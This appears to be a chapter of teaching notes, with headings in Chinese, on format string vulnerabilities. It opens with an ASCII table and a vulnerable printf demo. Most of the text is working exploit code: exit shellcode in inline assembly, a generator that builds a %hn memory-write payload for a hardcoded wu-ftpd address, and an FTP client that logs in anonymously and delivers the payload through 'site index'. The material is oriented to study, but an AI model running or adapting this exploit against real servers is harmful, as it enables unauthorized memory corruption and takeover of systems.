# Chapter 4: Introduction to Format String Bugs
## 格式化輸出之美  ascii.c
```
#include <stdlib.h>
#include <stdio.h>

int main( int argc, char *argv[] )
{
     int c;

     printf( "Decimal Hex Character\n" );
     printf( "======= === =========\n" );

     for( c = 0x20; c < 256; c++ )
     {
            switch( c )
            {
                    case 0x0a:
                    case 0x0b:
                    case 0x0c:
                    case 0x0d:
                    case 0x1b:
                           printf( "%7d  %02x \n", c, c );
                           break;
                    default:
                           printf( "%7d  %02x %c\n", c, c, c );
                           break;
             } 
     } 

     return 1;
}
```
```
編輯程式 ==> gedit ascii.c
編譯==>  gcc ascii.c -o ascii
執行 ==> ./ascii 

Decimal Hex Character
======= === =========
     32  20  
     33  21 !
     34  22 "
     35  23 #
     36  24 $
     37  25 %
     38  26 &
     39  27 '

```
## 格式化輸出之漏洞 fmt.c
```
#include <stdio.h>
#include <stdlib.h>

int main( int argc, char *argv[] )
{
        if( argc != 2 )
        {
                printf("Error - supply a format string please\n");
                return 1;
        }

        printf( argv[1] );
        printf( "\n" );

        return 0;
}
```
```
編輯程式 ==> gedit fmt.c
編譯==>  gcc fmt.c -o fmt

執行 1 ==> ./fmt
  Error - supply a format string please

執行 2 ==> ./fmt aaa
  aaa
  
執行 3 ==>./fmt aaa bbb
Error - supply a format string please
```

### exit.c
```
  #include <stdio.h>
  #include <stdlib.h>

  int main()
  {
          asm("\
                  xor %eax, %eax;\
                  xor %ecx, %ecx;\
                  xor %edx, %edx;\
                  mov $0x01, %al;\
                  xor %ebx, %ebx;\
                  mov $0x02, %bl;\
                  int $0x80;\
                  ");
                  
          return 1;
  }

```
##
```
#include <stdio.h>
#include <stdlib.h>

int safe_strcat( char *dest, char *src, unsigned dest_len )
{
     if( ( dest == NULL ) || ( src == NULL ) )
             return 0;

        if ( strlen( src ) + strlen( dest ) + 10 >= dest_len )
             return 0;

     strcat( dest, src );

     return 1;
}

int err( char *msg )
{
     printf("%s\n", msg);
     return 1;
}

int main( int argc, char *argv[] )
{
     // modify the strings below to upload different data to the wu-ftpd process...
     char *string_to_upload = "mary had a little lamb";
     unsigned int addr = 0x0806d3b0;

     // this is the offset of the parameter that 'contains' the start of our string.
     unsigned int param_num = 272;
     char buff[ 4096 ] = "";
     int buff_size = 4096;
     char tmp[ 4096 ] = "";
     int i, j, num_so_far = 6, num_to_print, num_so_far_mod;
     unsigned short s;
     char *psz;
     int num_addresses, a[4];
     
     // first work out How many addresses there are. num bytes / 2 + num bytes mod 2.

     num_addresses = (strlen( string_to_upload ) / 2) + strlen( string_to_upload) % 2;
     
     for( i = 0; i < num_addresses; i++ )
     {
            a[0] = addr & 0xff;
            a[1] = (addr & 0xff00) >> 8;
            a[2] = (addr & 0xff0000) >> 16;
            a[3] = (addr) >> 24;
            
            sprintf( tmp, "\\x%.02x\\x%.02x\\x%.02x\\x%.02x", a[0], a[1], a[2], a[3] );

            if( !safe_strcat( buff, tmp, buff_size )) 
                    return err("Oops. Buffer too small.");

            addr += 2;

            num_so_far += 4;
     }

     printf( "%s\n", buff );
     
     // now upload the string 2 bytes at a time. Make sure that 
     // num_so_far is appropriate by doing %2000x or whatever.
     psz = string_to_upload;

     while( (*psz != 0) && (*(psz+1) != 0) )
     {
            // how many chars to print to make (so_far % 64k)==s
            // 
            s = *(unsigned short *)psz;

            num_so_far_mod = num_so_far &0xffff;

            num_to_print = 0;
            
            if( num_so_far_mod < s )
                    num_to_print = s - num_so_far_mod;
            else
                    if( num_so_far_mod > s )
                          num_to_print = 0x10000 - (num_so_far_mod - s);
     
            // if num_so_far_mod and s are equal, we'll 'output' s any-way :o)
            num_so_far += num_to_print;

            // print the difference in characters
            if( num_to_print > 0 )
            {
                    sprintf( tmp, "%%%dx", num_to_print );
                    if(!safe_strcat( buff, tmp, buff_size ))
                           return err("Buffer too small.");
            }

            // now upload the 'short' value
            sprintf( tmp, "%%%d$hn", param_num );
            if( !safe_strcat( buff, tmp, buff_size ))
                    return err("Buffer too small.");
            
            psz += 2;
            param_num++;
     }
     
     printf( "%s\n", buff );

     sprintf( tmp, "./dowu localhost $'%s' 1\n", buff );

     system( tmp );     
     return 0;
}

```

## dowu.c
```
  #include <stdio.h>  #include <string.h>
  #include <stdlib.h>
  #include <sys/types.h>
  #include <sys/socket.h>
  #include <sys/time.h>
  #include <netdb.h>
  #include <unistd.h>
  #include <netinet/in.h>
  #include <arpa/inet.h>
  #include <signal.h>
  #include <errno.h>


  int connect_to_server(char*host){
       struct hostent *hp;
       struct sockaddr_in cl;
       int sock;
   
       if(host==NULL||*host==(char)0){
                       fprintf(stderr,"Invalid hostname\n");

               exit(1);

        }

       if((cl.sin_addr.s_addr=inet_addr(host))==-1) 
       {
               if((hp=gethostbyname(host))==NULL) 
               {
                       fprintf(stderr,"Cannot resolve %s\n",host);                   exit(1);
               }

               memcpy((char*)&cl.sin_addr,(char*)hp->h_addr,sizeof(cl.sin_addr));

        }
        if((sock=socket(PF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
        {

               fprintf(stderr,"Error creating socket: %s\n",strerror(errno));
               exit(1);   
        }
       
        cl.sin_family=PF_INET;
        cl.sin_port=htons(21);

        if(connect(sock,(struct sockaddr*)&cl,sizeof(cl))==-1)
        {
            fprintf(stderr,"Cannot connect to %s: %s\n",host,strerror(errno));
        }
  
        return sock;
   }


  int receive_from_server( int s, int print )
  {
       int retval;
       char buff[ 1024 * 64];	

       memset( buff, 0, 1024 * 64 );
       retval = recv( s, buff, (1024 * 63), 0 );
       if( retval > 0 )
       {
             if( print ) 
                   printf( "%s", buff );
       }
       else
       {
             if( print) 
                      printf( "Nothing to recieve\n" );

             return 0;
        }

        return 1;
   }

  int ftp_send( int s, char *psz )
{
        send( s, psz, strlen( psz ), 0 );
        return 1;
  }


    int syntax()
   {
        printf("Use\ndo_wu <host> <format string>\n");
        return 1;
  }


   int main( int argc, char *argv[] )
   {
          int s;
          char buff[ 1024 * 64 ];
          char tmp[ 4096 ];
        
      if( argc != 4 ) 
              return syntax();

           s = connect_to_server( argv[1] );
           
           if( s <= 0 )
                   _exit( 1 );

          receive_from_server( s, 0 );

          ftp_send( s, "user anonymous\n" );
          receive_from_server( s, 0 );
          ftp_send( s, "pass foo@example.com\n" );

          receive_from_server( s, 0 );

        if( atoi( argv[3] ) == 1 )
        {
               printf("Press a key to send the string...\n");
               getc( stdin );	
        }

           strcat( buff, "site index " );
           sprintf( tmp, "%.4000s\n", argv[2] );
           strcat( buff, tmp );

           ftp_send( s, buff );

           receive_from_server( s, 1 );

           shutdown( s, SHUT_RDWR );

      return 1;
   }


```

